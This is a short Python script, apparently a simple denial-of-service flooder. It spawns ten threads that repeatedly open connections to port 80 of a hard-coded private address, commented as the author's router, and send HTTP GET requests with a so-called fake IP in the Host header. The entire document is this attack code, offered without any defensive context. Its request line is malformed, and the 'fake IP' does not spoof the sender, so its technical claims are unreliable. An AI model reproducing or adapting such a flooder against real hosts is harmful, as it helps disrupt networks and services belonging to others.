import threading
import socket

target = '192.168.0.1' # my touter :(
port = 80 # http
fake_ip = '182.21.20.12'

def attack():
    c = 0
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()
        c += 1
        if c > 50:
            break

for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()